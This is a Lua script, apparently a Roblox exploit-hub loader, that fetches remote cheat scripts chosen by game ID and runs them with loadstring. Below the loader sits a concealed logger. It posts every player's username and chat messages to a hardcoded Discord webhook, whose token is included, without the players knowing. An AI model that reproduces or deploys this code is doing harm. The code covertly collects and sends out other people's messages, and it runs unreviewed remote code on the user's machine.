local links = {
  omnix = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20OMNI%20X.lua",
  Residence = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Residence%20Massacre.lua",
  Residence2 = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Residence%20cap%202.lua",
  area51 = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Survive%20and%20kill%20the%20Killers.lua",
  bear = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20BEAR%20ALPHA.lua",
  HomeAlone = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Home%20Alone.lua",
  BloxFruits = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Blox%20Fruits.lua",
  Benverse = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Benverse.lua",
  Ghoul = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Ghoul.lua",
  OmniAdventure = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Omni%20Adventure.lua",
  GPO = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Grand%20Piece%20Online.lua",
  Dingus = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Dingus.lua",
  MagicRNG = "https://raw.githubusercontent.com/KrypDeveloper/Quasar/main/src/Scripts/Quasar%20Hub%20Magic%20RNG.lua"
}

local utility = {
  [16365412402] = links.omnix,
  [16091658541] = links.omnix,
  [16129091908] = links.omnix,
  [521009548] = links.omnix,
  [16029997375] = links.omnix,
  [16365412402] = links.omnix,
  [16091658541] = links.omnix,
  [16129091908] = links.omnix,
  [5210095481] = links.omnix,
  [14437001043] = links.Residence,
  [14896802601] = links.Residence,
  [14896802601] = links.Residence,
  [16667550979] = links.Residence2,
  [155382109] = links.area51,
  [2092166489] = links.area51,
  [5740483929] = links.area51,
  [3182083477] = links.area51,
  [3203685552] = links.bear,
  [5441515225] = links.bear,
  [4398834993] = links.bear,
  [4565048785] = links.bear,
  [13477040473] = links.bear,
  [15985826131] = links.HomeAlone,
  [15988754129] = links.HomeAlone,
  [2753915549] = links.BloxFruits,
  [4442272183] = links.BloxFruits,
  [7449423635] = links.BloxFruits,
  [16389724472] = links.Benverse,
  [7622046644] = links.Ghoul,
  [16345284049] = links.OmniAdventure,
  [1730877806] = links.GPO,
  [3978370137] = links.GPO,
  [13924946576] = links.Dingus,
  [17250334236] = links.MagicRNG
}
local function verify()
  for id, script in pairs(utility) do
    if game.PlaceId == id then
      return true
    end
  end
end

if verify() then
  loadstring(game:HttpGet(utility[game.PlaceId]))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KrypDeveloper/RobloxScripts/main/OgeidXFrost%20OUTROS.lua"))()
end

if request then
    local marketplaceService = game:GetService("MarketplaceService")

    local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
    if isSuccessful then
        local wh = "https://discord.com/api/webhooks/1263596187819315221/UuvnB__wBq1pNh7rk2wIvePJyZGlfH_7ghBurGjzE3GDzBCGVgv4KUeGpUyzS3gCV1rZ"
        local embed1 = {
            ["title"] = "Beginning of Message logs on " ..
                info.Name .. " at " .. tostring(os.date("%m/%d/%y at time %X"))
        }
        local a =
            request(
            {
                Url = wh,
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed1}, ["content"] = ""}),
                Method = "POST"
            }
        )
        function logMsg(Webhook, Player, Message)
            local embed = {
                ["description"] = Player .. ": " .. Message .. "  " .. tostring(os.date("| time %X"))
            }
            local a =
                request(
                {
                    Url = Webhook,
                    Headers = {["Content-Type"] = "application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}, ["content"] = ""}),
                    Method = "POST"
                }
            )
        end
        for i, v in pairs(game.Players:GetPlayers()) do
            v.Chatted:Connect(
                function(msg)
                    logMsg(wh, v.Name, msg)
                end
            )
        end

        game.Players.PlayerAdded:Connect(
            function(plr)
                plr.Chatted:Connect(
                    function(msg)
                        logMsg(wh, plr.Name, msg)
                    end
                )
            end
        )
    end
end
